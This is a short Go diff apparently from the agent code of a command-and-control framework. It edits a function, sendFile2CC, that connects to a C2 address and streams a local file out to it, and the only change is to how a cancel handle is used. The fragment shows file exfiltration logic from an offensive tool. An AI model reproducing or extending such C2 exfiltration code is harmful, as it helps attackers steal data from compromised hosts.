@@ -130,13 +130,13 @@ func sendFile2CC(filepath string, offset int64, token string) (err error) {
 
 	// connect
 	url := emp3r0r_data.CCAddress + tun.FTPAPI + "/" + token
-	conn, _, cancel, err := ConnectCC(url)
+	conn, _, _, err := ConnectCC(url)
 	log.Printf("sendFile2CC: connection: %s", url)
 	if err != nil {
 		err = fmt.Errorf("sendFile2CC: connection failed: %v", err)
 		return
 	}
-	defer cancel()
+	// defer cancel()
 	defer conn.Close()
 
 	freader := bufio.NewReader(f)
